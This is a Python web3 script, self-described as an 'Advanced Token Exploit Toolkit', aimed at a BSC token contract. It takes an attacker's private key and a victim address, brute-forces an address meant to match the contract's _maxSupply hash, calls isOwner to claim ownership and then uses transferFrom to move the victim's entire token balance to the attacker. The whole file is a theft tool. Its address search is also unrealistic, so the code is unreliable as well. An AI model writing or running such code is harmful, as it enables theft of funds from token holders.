from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
import sha3

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Advanced Token Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)

# ===== TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

def generate_matching_address():
    """Find an address whose hash matches _maxSupply"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    max_supply = token.functions._maxSupply().call()
    
    print(f"[*] Searching for address matching maxSupply: {max_supply}")
    
    # This is a simplified version - in reality you'd need a more efficient method
    for i in range(1000):
        test_account = w3.eth.account.create()
        address_hash = int.from_bytes(sha3.keccak_256(test_account.address.encode()).digest(), 'big')
        
        if address_hash == max_supply:
            print(f"[+] Found matching address: {test_account.address}")
            return test_account
    
    print("[-] No matching address found in quick search")
    return None

def execute_exploit():
    """Main exploit execution flow"""
    # Step 0: Find or use an address that matches _maxSupply
    matching_account = generate_matching_address()
    if not matching_account:
        print("[-] Could not find address matching _maxSupply")
        return
    
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print(f"\n[+] Target Contract: {args.token_address}")
    print(f"[+] Using Privileged Address: {matching_account.address}")
    print(f"[+] Victim Address: {args.victim_address}")
    
    # Step 1: Claim ownership with the matching address
    print("\n[1] Claiming ownership with privileged address...")
    try:
        tx = token.functions.isOwner(matching_account.address).build_transaction({
            'from': matching_account.address,
            'nonce': w3.eth.get_transaction_count(matching_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        signed = matching_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
    except Exception as e:
        print(f"Error: {str(e)}")
        return
    
    # Step 2: Perform transfer
    print("\n[2] Attempting transfer...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    
    try:
        tx = token.functions.transferFrom(
            args.victim_address,
            matching_account.address,
            victim_bal
        ).build_transaction({
            'from': matching_account.address,
            'nonce': w3.eth.get_transaction_count(matching_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        
        signed = matching_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print("\n[+] Transfer Results:")
        print(f"TX Hash: {tx_hash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"New Victim Balance: {token.functions.balanceOf(args.victim_address).call()}")
    except Exception as e:
        print(f"\n[!] Transfer failed: {str(e)}")

if __name__ == "__main__":
    execute_exploit()
